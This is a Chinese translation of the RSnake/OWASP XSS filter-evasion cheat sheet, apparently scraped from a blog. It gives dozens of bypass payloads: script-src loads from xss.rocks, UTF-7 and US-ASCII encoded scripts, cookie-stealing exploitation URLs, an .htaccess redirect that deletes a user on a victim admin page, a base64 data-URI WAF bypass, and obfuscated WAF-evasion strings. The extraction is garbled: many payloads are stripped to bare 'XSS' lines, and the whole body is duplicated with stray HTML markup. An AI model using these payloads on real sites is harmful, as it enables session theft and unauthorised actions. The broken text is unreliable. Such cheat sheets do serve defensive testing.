利用标签的content属性进行XSS这种方案其实很不错,因为他没有任何明显的script或者Javascript指令,因为它使用base64编码.具体请参考RFC 2397了解更多详情,或者访问此处XSS编码器对你的XSSpaylod进行base64编码.
      

利用标签的带URL参数进行XSS绕过如果目标网站尝试检查URL是否包含http://,那么你可以使用以下payload来绕过它.( 由于Moritz Naumann提出);
      

利用标签进行XSS如果目标网站允许,那么会产生很多XSS问题.
      

利用事件触发标签的XSSIframes还有大多数其他元素可以使用像一下基于事件来进行混淆(由于David Cross提交.)
      

利用进行XSS与存在相同的问题.
      

利用标签进行XSS      

利用标签进行XSS如图上面所述,也容易受到包含Javascript的XSS payload攻击.
      
利用标签在DIV中使用background-image属性完成XSS      

使用background-image属性配合unicoded编码完成XSS这只是稍微修改去混淆下URL参数.它最早被Renaud Lifchitz发现用于攻击hotmaill;
      

使用background-image属性加上额外字符完成XSSRnaske建立了一个快速的XSS Fuzzer来检测半开扩号后允许的字符,但在安全的站点模式下IE和Netscape8.1中Javascript命令之前.这些都是十进制的,但当然可以利用十六进制进行填充.(可以使用以下任意字符: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)
      

利用DIV表达式完成XSS这个payload稍微修改下在冒号和” expression”中间加入一个换行符,可以非常有效绕过真实的XSS防护.
      

利用IE注释块进行XSS绕过尽在IE5.0及以上版本和使用IE渲染引擎模式的Netscape下有效.一些网站认为在注释内的内容是安全的,因此不需要移除.或者系统能够在页面某些部分添加注释标签，从而让它们失去有害性.如我们所知,这些操作(把内容注释掉的操作)可能是于事无补的:
      
利用标签进行XSS这在IE和Netscape8.1的安全模式下能起作用.你需要使用//注释掉下一个字符,避免JavaScript错误,从而让我们的XSS攻击向量正常执行.这也依赖于一个条件:网站图像使用相对地址如”images/image.jpg”,而非绝对地址.如果地址中包含了斜杠(“/images/image.jpg”)，你可以在XSS payload移除一个:
      

利用标签进行XSS如果页面允许标签,你甚至可以在页面挂马.下面链接指向的文件是一个可以包含你的XSS payload的HTML文件;
      

使用标签嵌入一个包含XSS的Flash动画如果你添加allowScriptAccess=“never”和allownetworking=”internal”属性,可以减轻这种风险(感谢Jonathan Vanasco提供信息);
   EMBED SRC=”http://ha.ckers.Using an   EMBED tag you can embed a Flash movie that contains XSS. Click here for a   demo. If you add the attributes allowScriptAccess=”never” and   allownetworking=”internal” it can mitigate this risk (thank you to   Jonathan Vanasco for the info).:   org/xss.swf”   AllowScriptAccess=”always”&gt;   
你可以嵌入包含XSS payload的SVG这个例子只在Firefox下有效，但它比上面的攻击向量要好一些，因为这不需要用户安装或开启Flash（感谢nEUrOO提供）：
      

使用ActionScript来混淆你的XSS payload   a=”get”;   b=”URL(\””;   c=”javascript:”;   d=”alert(‘XSS’);\”)”;   eval(a+b+c+d);   
利用XML数据与CDATA区段混淆进行XSS这个XSS payload仅限于IE和Netscape8.1中的IE渲染引擎中工作(由于Sec Consult在对yahoo进行审计时候发现这个payload)
         
利用XML的embedded方法在本地XML中嵌入Javascript这与上述相同,在本地托管(必须在同一台服务器上)包含你的XSS payload的XML文件.具体看示例;
         
利用XML中加入HTML+Time元素完成XSS这就是Grey Magic攻击hotmail和yahoo!的方法,这仅限于IE和Netscape8.1中使用,并记住,需要在HTML和标签之间使用;
      &lt;?xml:namespace prefix=”t”   ns=”urn:schemas-microsoft-com:time”&gt;   &lt;?import namespace=”t”   implementation=”#default#time2”&gt;   &lt;t:set attributeName=”innerHTML”   to=”XSSalert(“XSS”)“&gt;      

通过简单修改字符去绕过过滤器对”.js”的过滤可以将XSS payload的Javascript文件重命名为图片文件命名规则.
      

SSI(服务端包含)进行XSS这需要在服务器上安装SSI,这样才能使用这个XSS payload.可能不需要提及这一种攻击方法,如果攻击者可以在服务器上执行命令,那么这个安全问题就更严重了.
      
利用PHP完成XSS需要在服务器上安装php才能使用XSS payload.再次提醒下,如果你可以像这样远程运行任意脚本,那么可能有更多可怕的安全问题;
   &lt;? echo(‘&lt;SCR)’;   echo(‘IPT&gt;alert(“XSS”)‘);   ?&gt;   
利用IMG标签嵌入命令执行XSS它是需要用户认证后才可以执行命令的当前域页面。它将可以用于创建或者删除用户（如果访问者是管理员），或是在其他地方发送凭证等等，虽然较少被使用,但非常有效的。
译者注:可以理解为类似CSRF那种操作.
      









利用IMG标签嵌入命令执行XSS part II这是一种更加可怕地攻击,因为没有看起来可以区别的标示符,而且它也不用放在被攻击者网站上.攻击向量使用302或304来跳转图片到一个命令地址.一个正常的能够成为一个攻击工具,来执行相应的攻击命令.下面一个在Apache上的用来进行攻击的.htaccess文件的内容(感谢Timo提供)::
   Redirect 302 /a.jpg   http://victimsite.com/admin.asp&amp;deleteuser   
Cookie篡改我承认这是一种很隐蔽的攻击方式,但我曾经见过一些示例:页面允许标签,你可以用它来覆盖cookie.还有一些其他的示例:页面不是从数据库中取用户名,而是从cookie中读取.这两个场景相结合的情况下,你可以修改受害者的cookie,让你的XSS payload可以在页面上执行(同样你可以用它来改变用户状态，让它们以你的身份登录等):
      

利用UTF-7编码进行XSS如果页面存在XSS并且没有提供页面编码或者浏览器设置为UTF-7编码,页面就能遭到这种攻击（感谢Roman Ivanov）.在现代浏览器中,除非修改编码类型,否则这种攻击是不会产生的(Watchfire在google的404脚本中发现了这个漏洞)
      +ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-   
使用HTML引用封装进行XSS这个在IE测试过,视情况而定.对于允许””标签,但不允许通过”&amp;lt;SCRIPT SRC…”(正则表达式为:”/&amp;lt;script[^&amp;gt;]+src/I”),这种情况就可以考虑下此payload;&lt;/p&gt;
   &lt;SCRIPT a=&quot;&gt;&quot;   SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

对于允许””标签,但不允许”&lt;script src …&gt;”站点上执行XSS payload正则表达式为&lt;/p&gt;
&lt;p&gt;” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)&lt;em&gt;?”|’(.)&lt;/em&gt;?’|[^’”&amp;gt;\s]+))?)+\s&lt;em&gt;|\s&lt;/em&gt;)src/i”,(这个很重要,因为这种正则匹配很常见.)&lt;/p&gt;
   &lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

另外一个绕过类似这种正则过滤绕过,XSS payload.
(” /&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”)
      

最后一种绕过这种正则过滤,XSS payload,使用重音符(它无法在firefox下使用).正则表达式为:
“/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”;
   `   SRC=”httx://xss.rocks/xss.js”&amp;gt;   

这个XSS paylodad,会引起正则表达式不会匹配引号,同时发现会引起不正确的终止字符串.
      

一个令人担忧的XSS payload这种XSS payload让我很担忧,因为它几乎无法防御,除非禁用所有动态内容.
   document.write(“&amp;lt;SCRI”);PT   SRC=”httx://xss.rocks/xss.js”&gt;   

URL字符串绕过假定页面不允许出现http://www.google.com/;
利用IP代替域名   XSS   

利用URL编码   XSS   

利用双字节编码(注意:还有其他双字节编码方式,具体可以通过后面的IP混淆计算器来获取更多信息)
   XSS   

利用十六进制编码你可以在第2个数字看出来,每个数字允许的总大小在240之内.16进制的值是介于0~F之间的.从第3个数字看,前导0的也是不需要的:
   XSS   

利用八进制编码你可以填充0,但是要保证每个“数字”都不小于4个字符:
   XSS   



利用混合编码我们混合并匹配基本编码,添加一些制表符和换行符.这些符号需要包含在引号内才起作用.
   XSS   

利用协议解析绕过(//转换为http://能节省一些字符).当空间成为问题时,这是非常方便的方法.也能绕过类似于”(ht|f)tp(s)?://“的正则(感谢Ozh的提供).你可以将”//“改为”\”.你需要保证斜杠在准确的位置,否则有可能被当成一个相对路径.
   XSS   

利用Google”手气不错” part 1Firefox使用Google的手气不错功能来根据用户键入的关键字跳转到对应的网站.如果你的攻击页面在一些随机关键词的顶部,你可以使用这个特性来攻击Firefox用户.这利用了Firefox的“keyword:”协议.你可以通过使用若干关键词来达到目的:”keyword:XSS+RSnake”,这在Firefox2.0版本不再有效.
   XSS   

利用Google”手气不错” part 2这里使用了一个只有Firefox支持的小窍门.因为它是基于手气不错功能开发的.这个不支持opera，因为opera认为这是一个利用HTTP基本认证的网络钓鱼攻击.事实上它仅仅是一个畸形的URL.如果你单击这个链接的话,它就会产生作用.不过这个特性在Firefox2.0之后的版本也不支持了:
   XSS   

利用Google”手气不错” part 3这是一个畸形的Url,只能在Firefox和Opera中起作用.因为它们是基于手气不错功能实现的, 像上面的例子一样,它们需要你的网站在谷歌搜索中排名第一(例如google):
   XSS   

利用删除cnames结合上面的URL，移除www能节省4个字节：
   XSS   

利用额外点绕过   XSS   

利用Javascript链接地址   XSS   

利用内容替换的payload假定”http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子(IE: “java	script:”被转换为”java script:”,这在IE、安全模式下的Netscape 8.1+和Opera是有效的);
   XSS   





































字符转义表下面是&lt;字符在HTML和Javascript中所有组合.大多数不会被浏览器直接执行.但是在很多能够在上述某些特定情况下使用.
   &lt;    %3C   &amp;lt   &lt;   &amp;LT   &lt;   &amp;#60   &amp;#060   &amp;#0060   &amp;#00060   &amp;#000060   &amp;#0000060   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3c   &amp;#x03c   &amp;#x003c   &amp;#x0003c   &amp;#x00003c   &amp;#x000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3c   &amp;#X03c   &amp;#X003c   &amp;#X0003c   &amp;#X00003c   &amp;#X000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3C   &amp;#x03C   &amp;#x003C   &amp;#x0003C   &amp;#x00003C   &amp;#x000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3C   &amp;#X03C   &amp;#X003C   &amp;#X0003C   &amp;#X00003C   &amp;#X000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   \x3c   \x3C   \u003c   \u003C   
针对跨站脚本攻击-绕过WAF的方法一般问题
l  存储型XSS
如果攻击者绕过过滤器发起XSS攻击,WAF将无法防御攻击
l  反射型XSS
   Example:  … setTimeout(\”writetitle()\”,$_GET[xss])   …    Exploitation: /?xss=500);   alert(document.cookie);//   
基于DOM型XSS
   Example:  …   eval($_GET[xss]); …    Exploitation: /?xss=document.cookie   
XSS请求重定向容易受攻击代码:
   …    header(‘Refresh: 0; URL=’.$_GET[‘param’]);   …   
l  此请求WAF将会被拦截
   /?param=javascript:alert(document.cookie)   
l  利用编码将绕过WAF,并会在某些浏览器中执行XSS paylod.
   /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   
针对XSS bypass WAF的字符串                   “&gt;”&gt;’&gt;alert(String.fromCharCode(88,83,83))   “&gt;   “&gt;               &lt;iframe/src=”data:text/html,“&gt;      &lt;script   xlink:href=data:,window.open(‘https://www.google.com/&#39;)&gt;&lt;/script         X   &lt;img/%00/src=”worksinchrome:prompt(1)”/%00/onerror=’eval(src)’&gt;   //*{x:expression(alert(/xss/))}//&lt;style&gt;      On Mouse Over   &lt;img src=”/“ =_=”   title=”onerror=’prompt(1)’”&gt;   ClickMe    alert(1) &amp;lt;/script 1=2   &lt;form&gt;&lt;button   formaction=javascript&amp;colon;alert(1)&gt;CLICKME   &amp;lt;input/onmouseover=”javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;”   &lt;iframe   src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;   &lt;/p&gt;
&lt;h2 id=&quot;利用混淆绕过过滤器&quot;&gt;&lt;a href=&quot;#利用混淆绕过过滤器&quot; class=&quot;headerlink&quot; title=&quot;利用混淆绕过过滤器&quot;&gt;&lt;/a&gt;利用混淆绕过过滤器&lt;/h2&gt;&lt;p&gt;   (alert)(1)   a=alert,a(1)   [1].find(alert)   top&lt;a href=&quot;1&quot;&gt;“al”+”ert”&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;/al/.source+/ert/.source&lt;/a&gt;   al\u0065rt(1)   top&lt;a href=&quot;1&quot;&gt;‘al\145rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;‘al\x65rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;8680439..toString(30)&lt;/a&gt;   &lt;/p&gt;
&lt;h1 id=&quot;作者和主编&quot;&gt;&lt;a href=&quot;#作者和主编&quot; class=&quot;headerlink&quot; title=&quot;作者和主编&quot;&gt;&lt;/a&gt;作者和主编&lt;/h1&gt;&lt;p&gt;Robert “RSnake” Hansen&lt;/p&gt;
&lt;h1 id=&quot;贡献者&quot;&gt;&lt;a href=&quot;#贡献者&quot; class=&quot;headerlink&quot; title=&quot;贡献者&quot;&gt;&lt;/a&gt;贡献者&lt;/h1&gt;&lt;p&gt;Adam Lange&lt;/p&gt;
&lt;p&gt;Mishra Dhiraj其他备忘录&lt;/p&gt;
&lt;p&gt;就不一样介绍了,详情请访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&quot;&gt;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref1&quot;&gt;[1]&lt;/a&gt; XSS过滤绕过备忘单-&lt;a href=&quot;http://cheatsheets.hackdig.com/?4.htm&quot;&gt;http://cheatsheets.hackdig.com/?4.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref3&quot;&gt;[3]&lt;/a&gt; 不止有TAB,而且空格键也可以,并且可以利用两个空格来代替一个空格进行绕过测试.&lt;/p&gt;
</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用标签的background-image属性进行XSS"><span class="toc-number">52.</span> <span class="toc-text">利用标签的background-image属性进行XSS&lt;/h2&gt;   &lt;STYLE&gt;.XSS{background-image:url(“javascript:alert(‘XSS’)”);}## 利用标签的background属性进行XSS&lt;br&gt;&lt;br&gt;   &lt;STYLE   type=&quot;text/css&quot;&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}   

利用具有style属性的匿名的HTML标签进行XSSIE渲染引擎模式中IE6.0和Netscape8.1+并不关系你创建的html标签是否存在,只要它是以&lt;&gt;全开括号和字母开头就行;
      

利用本地HTC文件进行XSS这跟上述两个XSSpayload有点不同,因为它使用的.htc文件必须与XSS payload在同一域内.示例文件通过写入Javascript并利用style属性来运行;
      

US-ASCII编码US-ASCII编码(由于Kurt Huwig发现).这里使用7位代替8位,该XSS payload可以绕过很多基于内容检测的过滤器,但仅限于主机上使用US-ASCII编码传输或者你设置为此编码时才起作用.这对于WEB应用防火墙XSS过滤比对服务器端过滤绕过更有用.已知Apache Tomcat目前唯一以US-ASCII编码传输的服务器.
   ¼script¾alert(¢XSS¢)¼/script¾   
利用&lt; META &gt;标签进行XSS利用奇怪之处在于它不会在http头中发送引用referrer,因此它可以用用于某些类型攻击,你需要避免引入URL:
      

利用标签的content属性进行XSS这种方案其实很不错,因为他没有任何明显的script或者Javascript指令,因为它使用base64编码.具体请参考RFC 2397了解更多详情,或者访问此处XSS编码器对你的XSSpaylod进行base64编码.
      

利用标签的带URL参数进行XSS绕过如果目标网站尝试检查URL是否包含http://,那么你可以使用以下payload来绕过它.( 由于Moritz Naumann提出);
      

利用标签进行XSS如果目标网站允许,那么会产生很多XSS问题.
      

利用事件触发标签的XSSIframes还有大多数其他元素可以使用像一下基于事件来进行混淆(由于David Cross提交.)
      

利用进行XSS与存在相同的问题.
      

利用标签进行XSS      

利用标签进行XSS如图上面所述,也容易受到包含Javascript的XSS payload攻击.
      
利用标签在DIV中使用background-image属性完成XSS      

使用background-image属性配合unicoded编码完成XSS这只是稍微修改去混淆下URL参数.它最早被Renaud Lifchitz发现用于攻击hotmaill;
      

使用background-image属性加上额外字符完成XSSRnaske建立了一个快速的XSS Fuzzer来检测半开扩号后允许的字符,但在安全的站点模式下IE和Netscape8.1中Javascript命令之前.这些都是十进制的,但当然可以利用十六进制进行填充.(可以使用以下任意字符: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)
      

利用DIV表达式完成XSS这个payload稍微修改下在冒号和” expression”中间加入一个换行符,可以非常有效绕过真实的XSS防护.
      

利用IE注释块进行XSS绕过尽在IE5.0及以上版本和使用IE渲染引擎模式的Netscape下有效.一些网站认为在注释内的内容是安全的,因此不需要移除.或者系统能够在页面某些部分添加注释标签，从而让它们失去有害性.如我们所知,这些操作(把内容注释掉的操作)可能是于事无补的:
      
利用标签进行XSS这在IE和Netscape8.1的安全模式下能起作用.你需要使用//注释掉下一个字符,避免JavaScript错误,从而让我们的XSS攻击向量正常执行.这也依赖于一个条件:网站图像使用相对地址如”images/image.jpg”,而非绝对地址.如果地址中包含了斜杠(“/images/image.jpg”)，你可以在XSS payload移除一个:
      

利用标签进行XSS如果页面允许标签,你甚至可以在页面挂马.下面链接指向的文件是一个可以包含你的XSS payload的HTML文件;
      

使用标签嵌入一个包含XSS的Flash动画如果你添加allowScriptAccess=“never”和allownetworking=”internal”属性,可以减轻这种风险(感谢Jonathan Vanasco提供信息);
   EMBED SRC=”http://ha.ckers.Using an   EMBED tag you can embed a Flash movie that contains XSS. Click here for a   demo. If you add the attributes allowScriptAccess=”never” and   allownetworking=”internal” it can mitigate this risk (thank you to   Jonathan Vanasco for the info).:   org/xss.swf”   AllowScriptAccess=”always”&gt;   
你可以嵌入包含XSS payload的SVG这个例子只在Firefox下有效，但它比上面的攻击向量要好一些，因为这不需要用户安装或开启Flash（感谢nEUrOO提供）：
      

使用ActionScript来混淆你的XSS payload   a=”get”;   b=”URL(\””;   c=”javascript:”;   d=”alert(‘XSS’);\”)”;   eval(a+b+c+d);   
利用XML数据与CDATA区段混淆进行XSS这个XSS payload仅限于IE和Netscape8.1中的IE渲染引擎中工作(由于Sec Consult在对yahoo进行审计时候发现这个payload)
         
利用XML的embedded方法在本地XML中嵌入Javascript这与上述相同,在本地托管(必须在同一台服务器上)包含你的XSS payload的XML文件.具体看示例;
         
利用XML中加入HTML+Time元素完成XSS这就是Grey Magic攻击hotmail和yahoo!的方法,这仅限于IE和Netscape8.1中使用,并记住,需要在HTML和标签之间使用;
      &lt;?xml:namespace prefix=”t”   ns=”urn:schemas-microsoft-com:time”&gt;   &lt;?import namespace=”t”   implementation=”#default#time2”&gt;   &lt;t:set attributeName=”innerHTML”   to=”XSSalert(“XSS”)“&gt;      

通过简单修改字符去绕过过滤器对”.js”的过滤可以将XSS payload的Javascript文件重命名为图片文件命名规则.
      

SSI(服务端包含)进行XSS这需要在服务器上安装SSI,这样才能使用这个XSS payload.可能不需要提及这一种攻击方法,如果攻击者可以在服务器上执行命令,那么这个安全问题就更严重了.
      
利用PHP完成XSS需要在服务器上安装php才能使用XSS payload.再次提醒下,如果你可以像这样远程运行任意脚本,那么可能有更多可怕的安全问题;
   &lt;? echo(‘&lt;SCR)’;   echo(‘IPT&gt;alert(“XSS”)‘);   ?&gt;   
利用IMG标签嵌入命令执行XSS它是需要用户认证后才可以执行命令的当前域页面。它将可以用于创建或者删除用户（如果访问者是管理员），或是在其他地方发送凭证等等，虽然较少被使用,但非常有效的。
译者注:可以理解为类似CSRF那种操作.
      









利用IMG标签嵌入命令执行XSS part II这是一种更加可怕地攻击,因为没有看起来可以区别的标示符,而且它也不用放在被攻击者网站上.攻击向量使用302或304来跳转图片到一个命令地址.一个正常的能够成为一个攻击工具,来执行相应的攻击命令.下面一个在Apache上的用来进行攻击的.htaccess文件的内容(感谢Timo提供)::
   Redirect 302 /a.jpg   http://victimsite.com/admin.asp&amp;deleteuser   
Cookie篡改我承认这是一种很隐蔽的攻击方式,但我曾经见过一些示例:页面允许标签,你可以用它来覆盖cookie.还有一些其他的示例:页面不是从数据库中取用户名,而是从cookie中读取.这两个场景相结合的情况下,你可以修改受害者的cookie,让你的XSS payload可以在页面上执行(同样你可以用它来改变用户状态，让它们以你的身份登录等):
      

利用UTF-7编码进行XSS如果页面存在XSS并且没有提供页面编码或者浏览器设置为UTF-7编码,页面就能遭到这种攻击（感谢Roman Ivanov）.在现代浏览器中,除非修改编码类型,否则这种攻击是不会产生的(Watchfire在google的404脚本中发现了这个漏洞)
      +ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-   
使用HTML引用封装进行XSS这个在IE测试过,视情况而定.对于允许””标签,但不允许通过”&amp;lt;SCRIPT SRC…”(正则表达式为:”/&amp;lt;script[^&amp;gt;]+src/I”),这种情况就可以考虑下此payload;&lt;/p&gt;
   &lt;SCRIPT a=&quot;&gt;&quot;   SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

对于允许””标签,但不允许”&lt;script src …&gt;”站点上执行XSS payload正则表达式为&lt;/p&gt;
&lt;p&gt;” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)&lt;em&gt;?”|’(.)&lt;/em&gt;?’|[^’”&amp;gt;\s]+))?)+\s&lt;em&gt;|\s&lt;/em&gt;)src/i”,(这个很重要,因为这种正则匹配很常见.)&lt;/p&gt;
   &lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;   

另外一个绕过类似这种正则过滤绕过,XSS payload.
(” /&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”)
      

最后一种绕过这种正则过滤,XSS payload,使用重音符(它无法在firefox下使用).正则表达式为:
“/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”;
   `   SRC=”httx://xss.rocks/xss.js”&amp;gt;   

这个XSS paylodad,会引起正则表达式不会匹配引号,同时发现会引起不正确的终止字符串.
      

一个令人担忧的XSS payload这种XSS payload让我很担忧,因为它几乎无法防御,除非禁用所有动态内容.
   document.write(“&amp;lt;SCRI”);PT   SRC=”httx://xss.rocks/xss.js”&gt;   

URL字符串绕过假定页面不允许出现http://www.google.com/;
利用IP代替域名   XSS   

利用URL编码   XSS   

利用双字节编码(注意:还有其他双字节编码方式,具体可以通过后面的IP混淆计算器来获取更多信息)
   XSS   

利用十六进制编码你可以在第2个数字看出来,每个数字允许的总大小在240之内.16进制的值是介于0~F之间的.从第3个数字看,前导0的也是不需要的:
   XSS   

利用八进制编码你可以填充0,但是要保证每个“数字”都不小于4个字符:
   XSS   



利用混合编码我们混合并匹配基本编码,添加一些制表符和换行符.这些符号需要包含在引号内才起作用.
   XSS   

利用协议解析绕过(//转换为http://能节省一些字符).当空间成为问题时,这是非常方便的方法.也能绕过类似于”(ht|f)tp(s)?://“的正则(感谢Ozh的提供).你可以将”//“改为”\”.你需要保证斜杠在准确的位置,否则有可能被当成一个相对路径.
   XSS   

利用Google”手气不错” part 1Firefox使用Google的手气不错功能来根据用户键入的关键字跳转到对应的网站.如果你的攻击页面在一些随机关键词的顶部,你可以使用这个特性来攻击Firefox用户.这利用了Firefox的“keyword:”协议.你可以通过使用若干关键词来达到目的:”keyword:XSS+RSnake”,这在Firefox2.0版本不再有效.
   XSS   

利用Google”手气不错” part 2这里使用了一个只有Firefox支持的小窍门.因为它是基于手气不错功能开发的.这个不支持opera，因为opera认为这是一个利用HTTP基本认证的网络钓鱼攻击.事实上它仅仅是一个畸形的URL.如果你单击这个链接的话,它就会产生作用.不过这个特性在Firefox2.0之后的版本也不支持了:
   XSS   

利用Google”手气不错” part 3这是一个畸形的Url,只能在Firefox和Opera中起作用.因为它们是基于手气不错功能实现的, 像上面的例子一样,它们需要你的网站在谷歌搜索中排名第一(例如google):
   XSS   

利用删除cnames结合上面的URL，移除www能节省4个字节：
   XSS   

利用额外点绕过   XSS   

利用Javascript链接地址   XSS   

利用内容替换的payload假定”http://www.google.com/“被过滤器以编程方式被替换为空.我会使用类似的攻击向量借用过滤器的转换来绕过XSS过滤器从而创建攻击向量.下面是一个帮助创建攻击向量的例子(IE: “java	script:”被转换为”java script:”,这在IE、安全模式下的Netscape 8.1+和Opera是有效的);
   XSS   





































字符转义表下面是&lt;字符在HTML和Javascript中所有组合.大多数不会被浏览器直接执行.但是在很多能够在上述某些特定情况下使用.
   &lt;    %3C   &amp;lt   &lt;   &amp;LT   &lt;   &amp;#60   &amp;#060   &amp;#0060   &amp;#00060   &amp;#000060   &amp;#0000060   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3c   &amp;#x03c   &amp;#x003c   &amp;#x0003c   &amp;#x00003c   &amp;#x000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3c   &amp;#X03c   &amp;#X003c   &amp;#X0003c   &amp;#X00003c   &amp;#X000003c   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#x3C   &amp;#x03C   &amp;#x003C   &amp;#x0003C   &amp;#x00003C   &amp;#x000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   &amp;#X3C   &amp;#X03C   &amp;#X003C   &amp;#X0003C   &amp;#X00003C   &amp;#X000003C   &lt;   &lt;   &lt;   &lt;   &lt;   &lt;   \x3c   \x3C   \u003c   \u003C   
针对跨站脚本攻击-绕过WAF的方法一般问题
l  存储型XSS
如果攻击者绕过过滤器发起XSS攻击,WAF将无法防御攻击
l  反射型XSS
   Example:  … setTimeout(\”writetitle()\”,$_GET[xss])   …    Exploitation: /?xss=500);   alert(document.cookie);//   
基于DOM型XSS
   Example:  …   eval($_GET[xss]); …    Exploitation: /?xss=document.cookie   
XSS请求重定向容易受攻击代码:
   …    header(‘Refresh: 0; URL=’.$_GET[‘param’]);   …   
l  此请求WAF将会被拦截
   /?param=javascript:alert(document.cookie)   
l  利用编码将绕过WAF,并会在某些浏览器中执行XSS paylod.
   /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=   
针对XSS bypass WAF的字符串                   “&gt;”&gt;’&gt;alert(String.fromCharCode(88,83,83))   “&gt;   “&gt;               &lt;iframe/src=”data:text/html,“&gt;      &lt;script   xlink:href=data:,window.open(‘https://www.google.com/&#39;)&gt;&lt;/script         X   &lt;img/%00/src=”worksinchrome:prompt(1)”/%00/onerror=’eval(src)’&gt;   //*{x:expression(alert(/xss/))}//&lt;style&gt;      On Mouse Over   &lt;img src=”/“ =_=”   title=”onerror=’prompt(1)’”&gt;   ClickMe    alert(1) &amp;lt;/script 1=2   &lt;form&gt;&lt;button   formaction=javascript&amp;colon;alert(1)&gt;CLICKME   &amp;lt;input/onmouseover=”javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;”   &lt;iframe   src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;   &lt;/p&gt;
&lt;h2 id=&quot;利用混淆绕过过滤器&quot;&gt;&lt;a href=&quot;#利用混淆绕过过滤器&quot; class=&quot;headerlink&quot; title=&quot;利用混淆绕过过滤器&quot;&gt;&lt;/a&gt;利用混淆绕过过滤器&lt;/h2&gt;&lt;p&gt;   (alert)(1)   a=alert,a(1)   [1].find(alert)   top&lt;a href=&quot;1&quot;&gt;“al”+”ert”&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;/al/.source+/ert/.source&lt;/a&gt;   al\u0065rt(1)   top&lt;a href=&quot;1&quot;&gt;‘al\145rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;‘al\x65rt’&lt;/a&gt;   top&lt;a href=&quot;1&quot;&gt;8680439..toString(30)&lt;/a&gt;   &lt;/p&gt;
&lt;h1 id=&quot;作者和主编&quot;&gt;&lt;a href=&quot;#作者和主编&quot; class=&quot;headerlink&quot; title=&quot;作者和主编&quot;&gt;&lt;/a&gt;作者和主编&lt;/h1&gt;&lt;p&gt;Robert “RSnake” Hansen&lt;/p&gt;
&lt;h1 id=&quot;贡献者&quot;&gt;&lt;a href=&quot;#贡献者&quot; class=&quot;headerlink&quot; title=&quot;贡献者&quot;&gt;&lt;/a&gt;贡献者&lt;/h1&gt;&lt;p&gt;Adam Lange&lt;/p&gt;
&lt;p&gt;Mishra Dhiraj其他备忘录&lt;/p&gt;
&lt;p&gt;就不一样介绍了,详情请访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&quot;&gt;https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref1&quot;&gt;[1]&lt;/a&gt; XSS过滤绕过备忘单-&lt;a href=&quot;http://cheatsheets.hackdig.com/?4.htm&quot;&gt;http://cheatsheets.hackdig.com/?4.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#_ftnref3&quot;&gt;[3]&lt;/a&gt; 不止有TAB,而且空格键也可以,并且可以利用两个空格来代替一个空格进行绕过测试.&lt;/p&gt;
